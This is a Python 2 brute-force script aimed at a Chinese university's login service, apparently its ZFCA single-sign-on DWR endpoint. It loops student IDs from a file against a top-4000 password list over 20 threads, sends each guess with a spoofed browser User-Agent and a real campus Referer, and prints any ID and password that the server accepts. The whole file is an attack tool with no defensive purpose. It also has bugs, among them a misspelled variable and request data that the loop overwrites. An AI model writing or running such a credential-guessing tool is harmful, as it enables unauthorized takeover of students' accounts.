#!/usr/lib/env python
#coding:utf-8
#data:20170604

__Author__ = '1975'

import Queue
import threading
import urllib2
import urllib
import sys

pwds = Queue.Queue()
ids = Queue.Queue()
host = "http://xx.xx.edu.cn"
path = "/zfca/dwr/call/plaincall/UsermanAjax.validateLoginUser.dwr"
target_url = "%s%s" % (host, path)
#lock = threading.Lock()

def bruter():
    while True:
        student_id = ids.get()
        if student_id == "quit":
            break
        while True:
            student_pwd = pwds.get()
            if student_pwd == "quit":
                break
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Referer": "http://csrz.cqnu.edu.cn/zfca/securitycenter/loginzfca.jsp?tzdz=/main.do",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8"
            }
            post_data = {}
            post_data["callCount"] = 1
            post_data["page"] = "/zfca/securitycenter/loginzfca.jsp?tzdz=/main.do"
            #post_data["httpSessionId"] = "8E244B536BF5CD8C0E49A18595EAEA3B"
            #post_data["scriptSessionId"] = "4047D77CE0F8045CB8FF9BBBC6DED1AF104"
            post_data["c0-scriptName"] = "UsermanAjax"
            post_data["c0-methodName"] = "validateLoginUser"
            post_data["c0-id"] = 0
            post_data["c0-param0"] = "string:%s" % student_id   #学号文件
            post_data["c0-param1"] = "string:%s" % student_pwd  #密码文件
            post_data["c0-param2"] = "string:"
            post_data["c0-param3"] = "boolean:false"
            post_data["batchId"] = 0
        
            post_data = urllib.urlencode(post_data)
            try:
                request = urllib2.Request(target_url, data=post_data, headers=headers)
                response = urllib2.urlopen(request)
                data = response.read()
                #print data[49:116]
                #lock.acquire()
                if "uFF01" in data:
                    print "sutdent_id:%s   student_pwd:%s" % (sutdent_id, student_pwd)
                    #sys.exit()
                #else:
                    #print student_id, student_pwd
                #lock.release()
            except:
                pass


threads = []

try:
    m = int(sys.argv[2])
except:
    m = 20

for p in open("top4000.txt", "r").readlines():
    pwds.put(p.strip())

for p in open("ids.txt", "r").readlines():
    ids.put(p.strip())

for i in range(m):
    t = threading.Thread(target=bruter)
    threads.append(t)
    t.start()

for q in threads:
    pwds.put("quit")

for q in threads:
    ids.put("quit")

for t in threads:
    t.join()

print "[+] all Done."
